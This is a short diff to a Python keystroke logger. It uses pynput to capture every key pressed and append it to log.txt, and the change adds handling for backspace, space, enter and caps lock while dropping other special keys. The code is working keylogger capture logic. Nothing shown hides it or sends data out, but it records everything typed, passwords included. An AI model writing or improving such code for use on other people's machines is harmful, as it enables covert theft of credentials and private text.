@@ -1,14 +1,20 @@
 from pynput.keyboard import Listener
 
+
 def log_keystroke(key):
     key = str(key).replace("'", "")
 
-    if key == 'Key.space':
-        key = ' '
-    if key == 'Key.shift' or 'key.shift_r':
-        key = ''
-    if key == "Key.enter":
-        key = '\n'
+    if key.startswith("Key."):
+        if key == "Key.backspace":
+            key = ' BACKSPACE '
+        elif key == 'Key.space':
+            key = ' '
+        elif key == "Key.enter":
+            key = '\n'
+        elif key == 'Key.caps_lock':
+            key = ' CAPS_LOCKED '
+        else:
+            key = ''
 
     with open("log.txt", 'a') as f:
         f.write(key)
